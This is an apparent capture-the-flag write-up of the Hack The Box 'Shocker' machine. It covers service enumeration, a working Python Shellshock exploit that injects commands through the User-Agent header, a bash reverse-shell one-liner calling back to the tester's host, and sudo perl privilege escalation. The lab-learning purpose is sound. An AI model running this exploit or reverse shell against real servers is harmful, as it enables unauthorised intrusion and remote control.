---
title: "HTB - Shocker"
categories: [box]
date: 2022-10-29
comments: true
image: /images/walkthroughs/hackthebox/shocker/logo.png
favicon: /images/walkthroughs/hackthebox/shocker/logo.png
description: HTB - OpenSource walkthrough
---

# Shocker

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shocker/banner.png" width="70%"/>
</p>


## Summary

Socker is an easy machine where we exploit shelshock vulnerbility after spotting a script in the cgi-bin directory. 

Then we see that we can run perl with sudo and with no password. Using a shell escape from GTFOBins we ge ta root shell.


## Enumeration

- nmap:

```bash
nmap -sC -sV -p- 10.129.228.39 -oA nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-03 04:47 EST
Nmap scan report for 10.129.228.39
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
```


- gobuster:

```bash
gobuster dir -u "http://10.129.228.39" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20    
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.39
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/12/03 04:48:56 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/cgi-bin/             (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 301]
```

Since the website has the cgi-bin directory and there is not too much to do with the rest of the asset, let's try shellshock (hint in the machine name).

```bash
gobuster dir -u "http://10.129.228.39/cgi-bin" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 20 -x sh
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.39/cgi-bin
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
2022/12/03 16:32:50 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
```

We can use the nmap script to check if it is vulnerable:

```bash
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.129.228.39

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at 
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at 10.129.228.39 Port 80</address>
|   </body></html>
|   
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169

```

It is not running our command. We can insert the payload manually with Burp Suite or similar tools, but we can use [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Shellshock%20CVE-2014-6271.py) script, just for the sake of time (it is literally modify a header):

```python
from __future__ import print_function
from future import standard_library
standard_library.install_aliases()
from builtins import input
import sys, urllib.request, urllib.error, urllib.parse

if len(sys.argv) != 2:
        print("Usage: shell_shocker <URL>")
        sys.exit(0)

URL=sys.argv[1]
print("[+] Attempting Shell_Shock - Make sure to type full path")

while True:
        command=input("~$ ")
        opener=urllib.request.build_opener()
        opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]
        try:
                response=opener.open(URL)
                for line in response.readlines():
                        print(line.strip())
        except Exception as e: print(e)
```

We use the following payload to call our listener for a revshell:

```bash
/bin/bash -i &> /dev/tcp/10.10.14.2/5454 0>&1
```

And we get the user flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shocker/1_0_user.png" width="95%"/>
</p>


# Privesc

We can use sudo with no password to run perl as root, therefore, we can use the [GTFOBin](https://gtfobins.github.io/gtfobins/perl/#sudo) to escape and get a root shell:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shocker/2_0_sudo.png" width="70%"/>
</p>

We use the shell escape to get the root shell and the flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shocker/2_1_root.png" width="70%"/>
</p>

